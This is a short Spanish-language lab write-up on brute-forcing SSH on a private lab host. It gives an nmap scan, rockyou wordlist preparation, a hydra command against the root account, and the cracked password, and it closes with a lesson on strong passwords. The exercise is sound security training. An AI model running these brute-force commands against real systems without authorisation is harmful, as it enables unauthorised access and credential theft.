***Fuerza bruta SSH***

Objetivo
Host: 172.17.0.2
Servicio: SSH
Puerto: 22

Escaneo de puertos

Se realizó un escaneo básico con Nmap para identificar los servicios disponibles en el objetivo.

Comando utilizado:

nmap -sS -sV 172.17.0.2

Resultado obtenido:

22/tcp open ssh

El único servicio accesible en la máquina es SSH.

Preparación del diccionario

En Kali Linux el diccionario rockyou viene comprimido por defecto, por lo que es necesario descomprimirlo antes de usarlo.

Comando utilizado:

gunzip /usr/share/wordlists/rockyou.txt.gz

Una vez descomprimido, el diccionario queda disponible en la ruta:

/usr/share/wordlists/rockyou.txt

Ataque de fuerza bruta con Hydra

Se realizó un ataque de fuerza bruta contra el servicio SSH utilizando el usuario root y el diccionario rockyou.

Comando utilizado:

hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2

Credenciales obtenidas

El ataque fue exitoso y se obtuvieron las siguientes credenciales:

Host: 172.17.0.2
Usuario: root
Contraseña: estrella

Conclusión

La máquina expone únicamente el servicio SSH, pero el uso de una contraseña débil permitió comprometer el sistema mediante un ataque de fuerza bruta.
Este laboratorio demuestra la importancia de utilizar contraseñas robustas y restringir el acceso por contraseña al servicio SSH.
